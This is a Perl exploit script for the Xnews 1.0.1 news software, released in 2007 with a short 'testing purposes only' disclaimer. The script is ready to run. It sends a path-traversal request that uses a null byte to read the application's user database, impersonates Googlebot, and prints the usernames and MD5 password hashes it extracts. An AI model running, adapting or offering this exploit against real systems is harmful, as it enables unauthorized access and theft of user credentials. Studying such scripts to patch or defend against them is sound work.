#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                          XNews Remote File Disclosure Exploit                                 #
#################################################################################################
# Software: Xnews 1.0.1                                                                         #
#                                                                                               #
# Vendor: http://xpression.hogsmeade-village.com/                                               #
#                                                                                               #
# Released: 2007/01/28                                                                          #
#                                                                                               #
# Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
#                                                                                               #
# Note: The information provided in this document is for Xnews administrator                    #
# testing purposes only!                                                                        #
#                                                                                               #
# Whats up Timq, tgo, str0ke, dr max virus                                                      #
#################################################################################################

use IO::Socket;

$port = "80"; # connection port
$target = shift; # xpression.hogsmeade-village.com
$folder = shift; # /demo/

sub Header()
{
        print q
        {Xpression News File Disclosure Exploit - writ3r [at] gmail.com
--------------------------------------------------------------
};
}

sub Usage()
{
        print q
        {Usage: xnewsxpl.pl [target] [directory]
Example: xnewsxpl.pl xpression.hogsmeade-village.com /demo/
};
        exit();
}

Header();

if (!$target || !$folder) {
        Usage(); }

$res = false;
print "[+] Connecting...\r\n";
$xpack = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect on exploit attempt. Exiting...\r\n";
print $xpack "GET ".$folder."archives.php?xnews-template=../userdb.php%00 HTTP/1.1\n";
print $xpack "Host: $target\n";
print $xpack "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
print $xpack "Accept: text/html\n";
print $xpack "Connection: keep-alive\n\n\r\n";

while (<$xpack>)
{
        if (/(.*?)\|(.*?)\|(.*?)\|/) {
                print "Username: $1\n";
                print "MD5 Hash: $3\n";
                $res = true;
        exit; }

}
if ($res eq false) {
        print "[-] Exploit failed - Not vulnerable\n"; }

print "[!] Connection to host lost...\n";